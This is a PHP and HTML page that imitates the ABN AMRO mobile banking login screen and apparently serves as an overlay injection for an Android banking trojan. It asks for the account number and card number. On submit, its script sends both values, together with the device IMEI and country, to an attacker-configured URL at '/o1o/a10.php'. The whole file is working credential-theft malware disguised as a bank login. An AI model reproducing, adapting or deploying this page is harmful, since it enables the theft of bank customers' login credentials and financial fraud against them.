<html>
<head>
		<meta charset="UTF-8">
        <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
        <link href="nl/com.abnamro.nl.mobile.payments/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <h5 style="margin: 0;">Inloggen</h5>
        <h3 style="margin: 0; color: #2c7978;font-size: 18px;font-weight: 500;">Vul uw gegevens in</h3>
    </div>
    <div style="padding: 5px;">
        <form id="form">
            <div class="input-group mb-3">
                <div class="input-group-prepend">
                  <span class="input-group-text" style="border-radius: 0;">NL ** ABNA 0</span>
                </div>
                <input type="tel" class="form-control" id="login" name="login" style="border-radius: 0;" placeholder="Rekeningnummer" pattern="[0-9]{,10}" required>
            </div>
<script>
	document.getElementById('login').onkeypress = function (e) {
		return !(/[А-яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
	}
</script>
            <input type="passowrd" class="form-control" id="password" style="border-radius: 0;" name="password" placeholder="Pasnummer" required>

            <input type="submit" id="btn_finish" value="Volgende">
        </form>
    </div>
<script type="text/javascript">
         (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('btn_finish');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'form-control';
							oCodeInp.className = 'form-control';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'form-control error';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'form-control error';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|abnamro|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
</script>
</body>
</html>
